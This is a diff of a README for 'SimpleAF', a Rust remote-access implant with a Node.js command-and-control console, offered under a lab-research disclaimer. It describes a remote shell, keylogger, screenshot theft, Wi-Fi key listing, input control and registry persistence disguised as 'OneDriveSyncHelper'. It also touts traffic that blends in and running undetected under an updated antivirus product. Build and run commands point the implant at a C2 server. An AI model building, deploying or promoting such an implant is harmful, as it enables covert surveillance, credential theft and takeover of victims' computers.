@@ -1,34 +1,68 @@
 # SimpleAF
 
-Minimal Rust implant + Node.js operator console, built for security research in authorized lab environments.
-
-- **Implant** (`src/main.rs`): remote shell, keylogging with active-window capture, screenshots, Wi-Fi credential listing, mouse/keyboard control, HKCU Run-key persistence
-- **Operator console** (`server.js` + `public/`): session list, interactive terminal, quick actions
-
-## Demo
-
-Screenshots from the March 2026 lab run (Kali attacker box + Windows 11 24H2 target).
-
-![Operator console](assets/console_ready.png)
-*Operator console idle, waiting for implants.*
+Minimal Rust implant with a Node.js operator console, built for security research in authorized lab environments. HTTP command-and-control with per-session random tokens; the operator UI is a single-page terminal.
 
 ![Remote shell](assets/remote_shell.png)
 *Live session — `tasklist` output from the implant.*
 
-![Screenshot exfil](assets/screenshot_exfil.png)
-*A captured screenshot arriving in the operator's image viewer.*
+## Features
 
-![Kaspersky healthy](assets/kaspersky_no_active_threats.png)
-*Kaspersky Endpoint fully updated and cloud-connected during the test.*
+- Interactive `cmd` shell with per-session working-directory tracking
+- Keylogger with active-window titles
+- Screenshot capture (PowerShell + GDI, returned as Base64)
+- Wi-Fi profile and key listing (`netsh wlan`)
+- Mouse and keyboard control (move, click, type)
+- Registry persistence: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` as `OneDriveSyncHelper`
+- Plain HTTP polling so tasking blends with normal web traffic
 
-![Kaspersky shell](assets/kaspersky_remote_shell.png)
-*Interactive shell still active on the Kaspersky-protected host.*
+## Requirements
 
-Build & run:
+| Component | Notes |
+|-----------|-------|
+| Windows 10 / 11 | implant target |
+| Rust 1.75+ | `rustup` — MSVC or MinGW toolchain, for the implant |
+| Node.js 18+ | with npm, for the operator console |
 
-    cargo build --release          # implant
-    npm install && node server.js  # console on port 3307
+## Build
 
-The implant reads its C2 URL from the `C2_SERVER` environment variable (default `http://127.0.0.1:3307`).
+```bash
+cargo build --release
+```
 
-**Educational/research use only. Use only on systems you own or are explicitly authorized to test.**
+Output: `target\release\simpleaf-implant.exe`
+
+## Run
+
+**1. Operator console** (your machine):
+
+```bash
+npm install
+node server.js
+```
+
+Listens on port `3307` (override with the `PORT` env var). Open `http://localhost:3307`.
+
+**2. Implant** (lab target):
+
+```bat
+set C2_SERVER=http://<console-ip>:3307
+simpleaf-implant.exe
+```
+
+Defaults to `http://127.0.0.1:3307` when `C2_SERVER` is not set. The session appears in the console sidebar within a few seconds.
+
+## Operator controls
+
+Toolbar and quick actions: **Screenshot**, **Keylog** (start/stop), **Shell**, `whoami`, `ipconfig /all`, `net user`, `tasklist`, `netstat -ano`, `systeminfo`, plus mouse move/click and keystroke injection. Type any `cmd` command into the terminal bar.
+
+## Persistence cleanup (lab)
+
+```bat
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSyncHelper /f
+```
+
+Same implant running while Kaspersky Endpoint (fully updated, cloud-connected) is active on the host:
+
+![Kaspersky](assets/kaspersky_no_active_threats.png)
+
+**Educational / research purposes only. Use only on systems you own or have explicit written permission to test.**
